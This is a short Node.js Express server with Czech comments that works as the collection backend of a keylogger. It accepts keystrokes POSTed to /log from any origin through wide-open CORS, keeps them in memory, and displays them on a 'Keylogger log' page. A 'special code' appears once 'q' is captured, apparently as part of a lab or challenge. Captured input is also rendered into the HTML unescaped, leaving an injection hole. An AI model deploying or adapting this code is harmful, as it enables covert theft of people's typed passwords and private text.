const express = require("express");
const bodyParser = require("body-parser");
const app = express();

let keystrokes = [];

app.use(bodyParser.json());

// Povolení CORS, pokud by prohlížeč blokoval požadavek
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// Automatický reset po 5 minutách
setInterval(() => {
  console.log("⏳ Reset zachycených kláves...");
  keystrokes = [];
}, 5 * 60 * 1000); // 5 minut

app.post("/log", (req, res) => {
  const key = req.body.key;
  if (key) {
    keystrokes.push(key);
    console.log(`Zachyceno: ${key}`);
  }
  res.sendStatus(200);
});

app.get("/", (req, res) => {
  const specialMessage = keystrokes.includes("q")
    ? `<p><strong>Speciální kód:</strong> 78945</p>`
    : "";

  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="utf-8">
    <title>Keylogger Log</title>
    <style>
      body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background-color: #222;
        color: #eee;
        padding: 2rem;
        max-width: 800px;
        margin: auto;
      }
      h1 {
        color: #00ffcc;
      }
      p {
        font-size: 1.2rem;
        background: #333;
        padding: 1rem;
        border-radius: 8px;
      }
      .message {
        margin-top: 1rem;
        padding: 1rem;
        background: #444;
        border-left: 5px solid #00ffcc;
      }
    </style>
  </head>
  <body>
    <h1>Keylogger log</h1>
    <p>${keystrokes.join(" ") || "Zatím nic zachyceno."}</p>
    ${specialMessage ? `<div class="message">${specialMessage}</div>` : ""}
  </body>
  </html>
`);
});

app.listen(3000, () => {
  console.log("Server běží na portu 3000");
});